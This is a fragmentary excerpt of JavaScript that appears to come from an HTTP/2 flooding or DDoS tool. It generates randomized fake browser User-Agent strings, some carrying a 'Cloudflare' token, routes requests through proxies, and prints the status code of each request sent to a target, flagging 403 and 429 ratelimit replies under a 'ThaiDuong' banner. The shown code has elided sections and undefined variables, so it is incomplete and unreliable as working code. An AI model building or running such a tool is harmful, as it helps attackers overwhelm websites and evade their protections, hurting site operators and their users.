...
const generateHeaders = (browser) => {
    ...
    const version1 = getRandomInt(3,56);
const concu19cm = [
"Mozilla",
"Browser",
"Cloudflare",
...
const concubu = FA[Math.floor(Math.floor(Math.random() * FA.length))];
    ...
    const userAgent = {
        chrome: `${concudai}/${version1}.0 (Windows NT ${version1}.${version1}; Win64; x64; ${concubu}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `${concudai}/${version1}.0 (Macintosh; Intel Mac OS X 10_${version}_7; ${concubu}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `${concudai}/${version1}.0 (Windows NT ${version1}.${version1}; Win64; x64; ${concubu}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `${concudai}/${version1}.0 (Windows NT 10.0; Win64; x64; rv:${version}.0; ${concubu}) Gecko/20100101 Firefox/${version}.0`,
        mobile: `${concudai}/${version1}.0 (Linux; Android ${version1}; K; ${concubu}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36` ,
        opera: `${concudai}/${version1}.0 (Windows NT ${version1}.${version1}; Win64; x64; ${concubu}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}` ,
        operagx: `${concudai}/${version1}.0 (Windows NT ${version1}.${version1}; Win64; x64; ${concubu}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}`
    };
...
statuses = "HTTP/2 Forbidden".yellow;
} else if (res[":status"] === 429) {
statuses = "HTTP/2 Ratelimit".pink;
...
console.log(`(${'ThaiDuong'.bold.cyan}).  |. Proxy: ${proxy[0]}.  |. Target:${target}. |. Status: ${res[':status']} ${statuses}`);
